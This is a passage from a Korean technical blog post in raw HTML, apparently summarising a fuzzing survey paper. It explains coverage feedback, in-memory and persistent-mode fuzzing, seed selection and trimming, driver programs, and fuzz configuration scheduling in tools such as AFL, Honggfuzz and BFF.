&#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. Branch coverage&#xB294; bit vector&#xC758; &#xD615;&#xD0DC;&#xB85C; &#xC218;&#xC9D1;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; path collision&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB178;&#xB825;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>CollAFL : path-sensitive hash function&#xC73C;&#xB85C; &#xC774;&#xB97C; &#xD574;&#xACB0;</li><li>LibFuzzer, Syzkaller : node coverage&#xB97C; execution feedback&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;</li><li>Honggfuzz : execution feedback&#xC744; &#xC720;&#xC800;&#xAC00; &#xACE0;&#xB97C; &#xC218; &#xC788;&#xAC8C; &#xD568;</li></ul><h3 id="3-1-2-In-Memory-Fuzzing"><a href="#3-1-2-In-Memory-Fuzzing" class="headerlink" title="3.1.2 In-Memory Fuzzing"></a>3.1.2 In-Memory Fuzzing</h3><p>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xD06C;&#xBA74; &#xC624;&#xBC84;&#xD574;&#xB4DC;&#xB3C4; &#xD06C;&#xACA0;&#xC8E0;? &#xB9E4;&#xBC88; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; re-spawning&#xD558;&#xC9C0; &#xC54A;&#xACE0; PUT&#xC758; &#xC77C;&#xBD80;&#xB9CC; &#xD37C;&#xC9D5; &#xD574; &#xC624;&#xBC84;&#xD574;&#xB4DC; &#xCD5C;&#xC18C;&#xD654;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD2B9;&#xD788; GUI &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4; &#xAC19;&#xC740; &#xACBD;&#xC6B0; initializing&#xC774; &#xC815;&#xB9D0; &#xC624;&#xB798; &#xAC78;&#xB9AC;&#xB294;&#xB370;, &#xADF8;&#xB798;&#xC11C; initialization &#xC791;&#xC5C5;&#xC774; &#xB05D;&#xB09C; &#xC2DC;&#xC810;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC2A4;&#xB0C5;&#xC0F7;&#xC744; &#xCC0D;&#xC5B4;&#xB193;&#xACE0; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xAE30;&#xC220;&#xC744; in-memory fuzzing&#xC774;&#xB77C; &#xBD80;&#xB974;&#xACE0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC11C;&#xBC84; &#xAC04;&#xC758; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC774; &#xB9CE;&#xC740; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xD37C;&#xC9D5; &#xD560; &#xB54C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;.</p><p>GRR&#xC740; input byte&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xC2A4;&#xB0C5;&#xC0F7;&#xC744; &#xCC0D;&#xC5B4; &#xB9E4; iteration&#xB9C8;&#xB2E4; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xCD08;&#xAE30; &#xC2E4;&#xD589; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xAC74;&#xB108;&#xB701;&#xB2C8;&#xB2E4;.</p><p>AFL&#xC740; fork server&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBA87; &#xAC00;&#xC9C0; &#xC2A4;&#xD0C0;&#xD2B8;&#xC5C5; &#xCF54;&#xB4DC;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC120;&#xD0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. In-memory fuzzing&#xACFC; &#xBE44;&#xC2B7; &#xD558;&#xC9C0;&#xB9CC; &#xC2A4;&#xB0C5;&#xC0F7;&#xC744; &#xCC0D;&#xB294; &#xB300;&#xC2E0; iteration &#xB9C8;&#xB2E4; &#xC0C8;&#xB85C;&#xC6B4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; fork &#xD569;&#xB2C8;&#xB2E4;.</p><p>PUT&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xC6D0;&#xC0C1;&#xBCF5;&#xAD6C; &#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74;&#xC11C; &#xD2B9;&#xC815; &#xD568;&#xC218;&#xC5D0; &#xB300;&#xD55C; in-memory fuzzing&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. In-memory API fuzzing&#xC774;&#xB77C;&#xACE0; &#xD558;&#xB294;&#xB370; AFL&#xC758; persistence mode&#xAC00; &#xC774;&#xC5D0; &#xD574;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. PUT&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xC6D0;&#xC0C1; &#xBCF5;&#xAD6C;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xD2B9;&#xC815; &#xD568;&#xC218;&#xB97C; &#xB8E8;&#xD504;&#xB97C; &#xD1B5;&#xD574; &#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. Winnie &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C; &#xC9E7;&#xAC8C; &#xC5B8;&#xAE09;&#xD588;&#xB4EF;&#xC774; &#xC774;&#xB7F0; persistence mode&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; global state&#xB97C; &#xC11C;&#xC11C;&#xD788; &#xC624;&#xC5FC;&#xC2DC;&#xCF1C; false positive &#xACB0;&#xACFC;&#xAC00; &#xB098;&#xC62C; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; in-memory API fuzzing&#xC744; &#xD560; &#xB550; entry-point&#xAC00; &#xB420; &#xD568;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xB294;&#xB370; &#xB4DC;&#xB294; &#xB178;&#xB825;&#xC774; &#xC0C1;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="3-1-3-Thread-Scheduling"><a href="#3-1-3-Thread-Scheduling" class="headerlink" title="3.1.3 Thread Scheduling"></a>3.1.3 Thread Scheduling</h3><p>Race condition &#xBC84;&#xADF8;&#xB4E4;&#xC740; non-deterministic behavior(&#xBE44;&#xACB0;&#xC815;&#xB860;&#xC801; &#xD589;&#xB3D9;: &#xAC19;&#xC740; &#xC778;&#xD48B;&#xC744; &#xBC1B;&#xACE0;&#xB3C4; &#xB2E4;&#xB978; &#xD589;&#xB3D9;&#xC744; &#xBCF4;&#xC784;)&#xC5D0; &#xC758;&#xC874;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC544; &#xD2B8;&#xB9AC;&#xAC70; &#xD558;&#xAE30; &#xAE4C;&#xB2E4;&#xB86D;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; instrumentation&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC4F0;&#xB798;&#xB4DC; &#xCC98;&#xB9AC; &#xC21C;&#xC11C;&#xB97C; &#xC815;&#xD558;&#xBA74;(Thread scheduling) &#xD2B9;&#xC815; &#xBE44;&#xACB0;&#xC815;&#xB860;&#xC801; &#xD589;&#xB3D9;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="3-2-Seed-selection"><a href="#3-2-Seed-selection" class="headerlink" title="3.2 Seed selection"></a>3.2 Seed selection</h2><p><img src="/2021/10/03/fabu1ous/fuzz-2/5.png" alt></p><p>&#xD37C;&#xC800;&#xB294; fuzz configuration &#xC9D1;&#xD569;&#xC744; &#xBC1B;&#xC544; fuzzing algorithm&#xC758; &#xD589;&#xB3D9;&#xC744; &#xC81C;&#xC5B4;&#xD569;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; fuzz configuration&#xC758; &#xBA87;&#xBA87; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB4E4; value domain(&#xC815;&#xC758;&#xC5ED;)&#xC774; &#xB108;&#xBB34; &#xBC29;&#xB300;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74; mutation-based fuzzer&#xC758; seed&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. mp3&#xD30C;&#xC77C;&#xC744; &#xC2DC;&#xB4DC;&#xB85C; &#xD37C;&#xC9D5; &#xD55C;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD574;&#xBCF4;&#xBA74; &#x201C;&#xC815;&#xC0C1;&#xC801;&#xC778; mp3&#xD30C;&#xC77C;&#x201D;&#xC758; &#xBC94;&#xC704;&#xB294; &#xBB34;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;. &#xC138;&#xC0C1;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xB178;&#xB798;&#xC640; &#xC55E;&#xC73C;&#xB85C; &#xB098;&#xC62C; &#xB178;&#xB798; &#xBAA8;&#xB450; &#xC815;&#xC0C1;&#xC801;&#xC778; mp3&#xD30C;&#xC77C;&#xC758; &#xBC94;&#xC8FC;&#xC548;&#xC5D0; &#xB4E4;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; &#xC911;&#xC5D0;&#xC11C; &#xC5B4;&#xB5A4; &#xC2DC;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD558;&#xB294; &#xAC78;&#xAE4C;&#xC694;?</p><p>&#xCD08;&#xAE30; seed pool&#xC758; &#xD06C;&#xAE30; &#xCD95;&#xC18C; &#xBB38;&#xC81C;&#xB97C; seed selection problem&#xC774;&#xB77C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xC811;&#xADFC;&#xBC95;&#xC774; &#xC788;&#xC9C0;&#xB9CC; &#xAC00;&#xC7A5; &#xD754;&#xD788; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBC29;&#xBC95;&#xC740; minset(&#xCD5C;&#xB300; coverage metric&#xC744; &#xAC16;&#xB294; &#xCD5C;&#xC18C; seed &#xC9D1;&#xD569;)&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC801;&#xC740; &#xC2E4;&#xD589; &#xC2DC;&#xAC04; &#xBE44;&#xC6A9;&#xC73C;&#xB85C; &#xB9CE;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB85C;&#xC9C1;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xC57C; &#xBC84;&#xADF8; &#xBC1C;&#xACAC;&#xC728;&#xC744; &#xC99D;&#xAC00;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xACA0;&#xC8E0;?</p><p>seed selection&#xC740; Preprocess &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; ConfUPDATE &#xB2E8;&#xACC4;&#xC5D0;&#xC11C;&#xB3C4; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC591;&#xD55C; coverage metic&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370;, &#xBA3C;&#xC800; AFL&#xC740; &#xAC01; branch&#xC758; logarithmic counter(&#xC9C0;&#xC218; &#xCE74;&#xC6B4;&#xD130;)&#xB97C; &#xC774;&#xC6A9;&#xD55C; branch coverage &#xAE30;&#xBC18; &#xD37C;&#xC800;&#xC785;&#xB2C8;&#xB2E4;. branch counter&#xC758; &#xD06C;&#xAE30; &#xC815;&#xB3C4;(&#xC0C1;&#xC6A9;&#xB85C;&#xADF8;&#xC758; &#xCC99;&#xB3C4;: &#xADFC;&#xC0AC;&#xAC12;&#xC758; &#xD06C;&#xAE30; &#xB4F1;&#xAE09;)&#xAC00; &#xB2EC;&#xB77C;&#xC57C; &#xB2E4;&#xB978; branch count&#xB85C; &#xCDE8;&#xAE09;&#xD558;&#xB3C4;&#xB85D; &#xAD6C;&#xD604;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>HonggFuzz&#xB294; &#xC2E4;&#xD589;&#xB41C; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC758; &#xAC1C;&#xC218;, &#xC2E4;&#xD589;&#xB41C; branch &#xAC1C;&#xC218;, &#xC2E4;&#xD589;&#xB41C; unique basic block &#xAC1C;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; coverage&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="3-3-Seed-Trimming"><a href="#3-3-Seed-Trimming" class="headerlink" title="3.3 Seed Trimming"></a>3.3 Seed Trimming</h2><p>&#xD06C;&#xAE30;&#xAC00; &#xC791;&#xC740; seed&#xC77C;&#xC218;&#xB85D; &#xBA54;&#xBAA8;&#xB9AC; &#xC18C;&#xBAA8;&#xB7C9;&#xC774; &#xC801;&#xACE0;, &#xB192;&#xC740; &#xCC98;&#xB9AC;&#xB7C9;(throughput)&#xC744; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xBA87;&#xBA87; &#xD37C;&#xC800;&#xB4E4;&#xC740; &#xD37C;&#xC9D5; &#xC804;&#xC5D0; seed&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC904;&#xC774;&#xB294; seed trimming &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. Seed trimming&#xC740; Preprocess&#xB098; ConfUPDATE &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>AFL&#xC758; &#xACBD;&#xC6B0; seed&#xAC00; &#xB3D9;&#xC77C;&#xD55C; coverage&#xB97C; &#xAC16;&#xB294; &#xBC94;&#xC704;&#xC5D0;&#xC11C; &#xC11C;&#xC11C;&#xD788; seed&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xC0AD;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Linux system call handler&#xB97C; &#xD37C;&#xC9D5; &#xD560; &#xB54C;&#xB294; static &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC54C;&#xC544;&#xB0B8; call dependency&#xAC00; &#xB2EC;&#xB77C;&#xC9C0;&#xC9C0; &#xC54A;&#xB294; &#xC120;&#xC5D0;&#xC11C; seed&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC904;&#xC774;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="3-4-Preparing-a-Driver-Application"><a href="#3-4-Preparing-a-Driver-Application" class="headerlink" title="3.4 Preparing a Driver Application"></a>3.4 Preparing a Driver Application</h2><p>PUT&#xC744; &#xC9C1;&#xC811; &#xD37C;&#xC9D5; &#xD558;&#xB294; &#xAC83;&#xC774; &#xC5B4;&#xB824;&#xC6B4; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74; PUT&#xC774; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC77C; &#xB54C;, &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC18D; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC8FC;&#xB294; &#xC911;&#xAC04;&#xB2E4;&#xB9AC; &#xC5ED;&#xD560;&#xC758; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; driver &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB77C; &#xBD80;&#xB974;&#xB294;&#xB370;, &#xD754;&#xD788; driver&#xB77C;&#xACE0; &#xB9D0;&#xD560; &#xB54C; &#xB5A0;&#xC62C;&#xB9AC;&#xB294; device driver&#xC640;&#xB294; &#xB2E4;&#xB978; &#xAC1C;&#xB150;&#xC785;&#xB2C8;&#xB2E4;. fuzz campaign &#xC2DC;&#xC791; &#xC804;&#xC5D0; &#xD55C; &#xBC88;&#xB9CC; &#xB9CC;&#xB4E4;&#xBA74; &#xB418;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#xC0C1;&#xB2F9;&#xD788; &#xBC88;&#xAC70;&#xB85C;&#xC6B4; &#xC791;&#xC5C5;&#xC785;&#xB2C8;&#xB2E4;. &#xC81C;&#xAC00; &#xC791;&#xC131;&#xD55C; WinAFL &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C; &#xC5BC;&#xB9C8;&#xB098; &#xADC0;&#xCC2E;&#xC740; &#xC791;&#xC5C5;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558; &#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xCEE4;&#xB110;&#xC744; &#xD37C;&#xC9D5; &#xD558;&#xAE30; &#xC704;&#xD574; &#xC720;&#xC800; &#xB79C;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xAC70;&#xB098; IoT &#xC7A5;&#xBE44;&#xB97C; &#xD37C;&#xC9D5; &#xD558;&#xAE30; &#xC704;&#xD574; &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB4F1;&#xC774; driver application&#xC758; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Harness &#xB610;&#xD55C; Driver&#xC758; &#xAC1C;&#xB150; &#xC548;&#xC5D0; &#xC18D;&#xD574;&#xC788;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB418;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="4-Scheduling"><a href="#4-Scheduling" class="headerlink" title="4. Scheduling"></a>4. Scheduling</h1><pre><code class="hljs livescript">Schedule<span class="hljs-function"><span class="hljs-params">(C, t_elapsed, t_limit)</span> -&gt;</span> conf</code></pre><p>&#xC2A4;&#xCF00;&#xC974;&#xB9C1;&#xC740; &#xB2E4;&#xC74C; iteration&#xC5D0; &#xC801;&#xC6A9;&#xD560; fuzz configuration&#xC744; &#xC815;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. &#xB2F9;&#xC5F0;&#xD788; &#xD37C;&#xC800;&#xC758; &#xC885;&#xB958;&#xC5D0; &#xB530;&#xB77C; configuration&#xC758; &#xB0B4;&#xC6A9;&#xC774; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD558;&#xB098;&#xC758; configuration&#xB9CC;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xC2A4;&#xCF00;&#xC974;&#xB9C1; &#xB2E8;&#xACC4;&#xAC00; &#xC5C6;&#xB294; &#xD37C;&#xC800;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; BFF&#xB098; AFLFast&#xCC98;&#xB7FC; &#xC798; &#xC9DC;&#xC5EC;&#xC9C4; &#xC2A4;&#xCF00;&#xC974;&#xB9C1;&#xC73C;&#xB85C; &#xC131;&#xACF5;&#xD55C; &#xC0AC;&#xB840;&#xB3C4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC8FC;&#xBAA9;&#xD574; &#xBCFC; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>white-box&#xC758; &#xACBD;&#xC6B0; symbolic executor &#xB4F1; &#xBCF5;&#xC7A1;&#xD55C; &#xB0B4;&#xC6A9;&#xC774; &#xB9CE;&#xC544; &#xC0DD;&#xB7B5;&#xD558;&#xACE0; black-box&#xC640; grey-box &#xD37C;&#xC800;&#xC758; Scheduling &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xB9CC;&#xC744; &#xB2E4;&#xB8F9;&#xB2C8;&#xB2E4;.</p><h2 id="4-1-Fuzz-Configuration-Scheduling-FCS-Problem"><a href="#4-1-Fuzz-Configuration-Scheduling-FCS-Problem" class="headerlink" title="4.1 Fuzz Configuration Scheduling (FCS) Problem"></a>4.1 Fuzz Configuration Scheduling (FCS) Problem</h2><p><img src="/2021/10/03/fabu1ous/fuzz-2/6.png" alt></p><p>&#xC2A4;&#xCF00;&#xC974;&#xB9C1;&#xC758; &#xBAA9;&#xC801;&#xC740; &#xD604;&#xC7AC; &#xC774;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xD1B5;&#xD574; &#xCD5C;&#xC120;&#xC758; &#xACB0;&#xACFC;&#xB97C; &#xB0BC; &#xC218; &#xC788;&#xB294; configuration&#xC744; &#xC815;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74; unique &#xBC84;&#xADF8;&#xB97C; &#xAC00;&#xC7A5; &#xB9CE;&#xC774; &#xCC3E;&#xAC70;&#xB098;, &#xAC00;&#xC7A5; &#xB113;&#xC740; &#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xB97C; &#xAC00;&#xC9C8; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xB418;&#xB294; configuration&#xC744; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xBAA8;&#xB4E0; &#xC2A4;&#xCF00;&#xC974;&#xB9C1; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; Exploration(&#xD0D0;&#xC0C9;)&#xACFC; Exploitation(&#xD65C;&#xC6A9;) &#xC0AC;&#xC774;&#xC5D0;&#xC11C; &#xAC08;&#xB4F1;&#xD569;&#xB2C8;&#xB2E4;.(Exploration vs Exploitation trade off)</p><ul><li>exploration : &#xBBF8;&#xB798;&#xB97C; &#xC704;&#xD574; &#xCD5C;&#xB300;&#xD55C; &#xB9CE;&#xC740; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xB294; &#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xAC08; &#xAC83;&#xC774;&#xB0D0;</li><li>exploitation : &#xC2E4;&#xC9C1;&#xC801;&#xC778; &#xC131;&#xACFC;&#xB97C; &#xB0B4;&#xB294; &#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xAC08; &#xAC83;&#xC774;&#xB0D0;</li></ul><p>&#xADF8;&#xB9AC;&#xACE0; &#xD37C;&#xC9D5;&#xC5D0;&#xC120; &#xC774;&#xB7F0; &#xBB38;&#xC81C;&#xB97C; Fuzz configuration Scheduling(FCS) &#xBB38;&#xC81C;&#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><h2 id="4-2-Black-box-FCS-Algorithms"><a href="#4-2-Black-box-FCS-Algorithms" class="headerlink" title="4.2 Black-box FCS Algorithms"></a>4.2 Black-box FCS Algorithms</h2><p>&#xBE14;&#xB799;&#xBC15;&#xC2A4;&#xC758; &#xACBD;&#xC6B0; FCS &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xB294; &#xC774;&#xC804; configuration&#xC758; &#xD37C;&#xC9D5; &#xACB0;&#xACFC;&#xBC16;&#xC5D0; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74; &#xD06C;&#xB798;&#xC26C;&#xC640; &#xBC84;&#xADF8;&#xC758; &#xC218;, &#xC18C;&#xBAA8;&#xB41C; &#xC2DC;&#xAC04; &#xB4F1;&#xC774; &#xC788;&#xACA0;&#xC8E0;. &#xC774;&#xB7F0; &#xC815;&#xBCF4;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xCC98;&#xC74C; &#xC5F0;&#xAD6C;&#xB418;&#xACE0; &#xC801;&#xC6A9;&#xB41C; &#xAC8C; BFF&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC5F0;&#xAD6C;&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xACE0; BFF&#xC758; &#xC131;&#xB2A5;&#xC740; (&#xC2E4;&#xD589;&#xB2F9; &#xBC84;&#xADF8;&#xC218;)&#xAC00; 85% &#xC99D;&#xAC00;&#xD588;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC798; &#xC9DC;&#xC5EC;&#xC9C4; FCS &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC758; &#xC911;&#xC694;&#xC131;&#xC774; &#xC8FC;&#xBAA9;&#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACE7;&#xBC14;&#xB85C; &#xD6C4;&#xC18D; &#xC5F0;&#xAD6C;&#xB4E4;&#xC774; &#xB098;&#xC654;&#xB294;&#xB370;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC544;&#xC774;&#xC774;&#xC5B4;&#xB85C; FCS &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xAC1C;&#xC120;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>&#xBE14;&#xB799;&#xBC15;&#xC2A4; &#xBBA4;&#xD14C;&#xC774;&#xC158; &#xD37C;&#xC9D5;&#xC758; &#xC218;&#xD559;&#xC801; &#xBAA8;&#xB378;&#xC744; &#xAE30;&#xC874;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB358; Bernoulli trial(&#xBCA0;&#xB974;&#xB204;&#xC774; &#xC2E4;&#xD589;)&#xC5D0;&#xC11C; WCCP/UW(Weighted Coupon Collector&#x2019;s Problem with Unknown Weights)&#xC73C;&#xB85C; &#xBC14;&#xAFC8;</p><p><img src="/2021/10/03/fabu1ous/fuzz-2/7.png" alt></p><ul><li><p>&#xBCA0;&#xB974;&#xB204;&#xC774; &#xC2DC;&#xD589;</p><ul><li>&#xB3D9;&#xC804; &#xB358;&#xC9C0;&#xAE30;&#xB97C; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xB428;</li><li>&#xC131;&#xACF5;, &#xC2E4;&#xD328; &#xB458; &#xC911; &#xD558;&#xB098;&#xC758; &#xACB0;&#xACFC;&#xB9CC; &#xC874;&#xC7AC;</li><li>&#xAC01; configuration&#xC740; &#xACE0;&#xC815;&#xB41C; &#xC131;&#xACF5;&#xB960;&#xC774; &#xC788;&#xB2E4;&#xACE0; &#xAC00;&#xC815;</li></ul></li><li><p>&#xCFE0;&#xD3F0; &#xC218;&#xC9D1; &#xBB38;&#xC81C;</p><ul><li>&#xD3EC;&#xCF13;&#xBAAC; &#xBE75;&#xC744; &#xC0AC;&#xBA74; 255&#xB9C8;&#xB9AC;&#xC758; &#xD3EC;&#xCF13;&#xBAAC;&#xC911; &#xD558;&#xB098;&#xC758; &#xC2A4;&#xD2F0;&#xCEE4;&#xB97C; &#xC5BB;&#xC74C;.</li><li>255&#xB9C8;&#xB9AC; &#xD3EC;&#xCF13;&#xBAAC; &#xC2A4;&#xD2F0;&#xCEE4;&#xB97C; &#xBAA8;&#xB450; &#xC218;&#xC9D1;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBA87; &#xAC1C;&#xC758; &#xBE75;&#xC744; &#xBA39;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xAC00;? &#xC640; &#xAC19;&#xC740; &#xC9C8;&#xBB38;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xB41C; &#xBB38;&#xC81C;</li><li>&#xD37C;&#xC9D5; &#xD558;&#xBA74;&#xC11C; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; 